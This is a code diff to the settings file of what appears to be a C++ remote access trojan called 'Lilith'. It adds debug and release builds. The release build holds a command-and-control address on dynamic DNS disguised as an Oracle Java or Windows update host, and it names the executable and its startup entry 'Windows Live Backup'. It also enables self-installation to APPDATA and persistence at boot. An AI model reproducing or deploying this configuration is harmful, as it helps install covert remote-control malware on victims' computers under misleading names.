@@ -1,15 +1,34 @@
 #include "settings.h"
 
-std::string Settings::serverIP = "windistupdate.ddns.net";		//server ip
-int Settings::serverPort = 47128;
+#if _DEBUG
+std::string Settings::serverIP = "127.0.0.1";		//server ip
+int Settings::serverPort = 1111;	//server port
 
-std::string Settings::fileName = "winlive.exe";					//file name
+std::string Settings::fileName = "lilithDEBUG.exe";					//file name
+std::string Settings::folderName = "lilithDEBUG folder";					//name of folder where file is located
+std::string Settings::startupName = "lilithDEBUG startup";		//startup name in registry / taskmgr
+std::string Settings::logFileName = "log.txt";								//name of log file
+std::string Settings::installLocation = "APPDATA";			//install location (appdata, programdata etc)
+bool Settings::installSelf = false;				//specifies whether the program should install itself
+bool Settings::startOnNextBoot = false;		//specifies whether it should startup the installed clone of itself NOW or ON THE NEXT BOOT (ONLY IMPORTANT FOR INSTALLATION PROCESS)
+bool Settings::meltSelf = false;				//specifies whether the installed clone should delete the initial file
+bool Settings::setStartupSelf = false;			//specifies whether the program is to be started on system boot
+bool Settings::logEvents = true;
+
+#else
+
+std::string Settings::serverIP = "oraclejavaseupdate.ddns.net";	/*windistupdate.ddns.net*/	//server ip
+int Settings::serverPort = 47128;	//server port
+
+std::string Settings::fileName = "winliveback.exe";					//file name
 std::string Settings::folderName = "Windows Live";					//name of folder where file is located
-std::string Settings::startupName = "Windows Live";		//startup name in registry / taskmgr
+std::string Settings::startupName = "Windows Live Backup";		//startup name in registry / taskmgr
 std::string Settings::logFileName = "log.txt";								//name of log file
 std::string Settings::installLocation = "APPDATA";			//install location (appdata, programdata etc)
 bool Settings::installSelf = true;				//specifies whether the program should install itself
 bool Settings::startOnNextBoot = false;		//specifies whether it should startup the installed clone of itself NOW or ON THE NEXT BOOT (ONLY IMPORTANT FOR INSTALLATION PROCESS)
-bool Settings::meltSelf = true;				//specifies whether the installed clone should delete the initial file
+bool Settings::meltSelf = false;				//specifies whether the installed clone should delete the initial file
 bool Settings::setStartupSelf = true;			//specifies whether the program is to be started on system boot
 bool Settings::logEvents = true;
+
+#endif
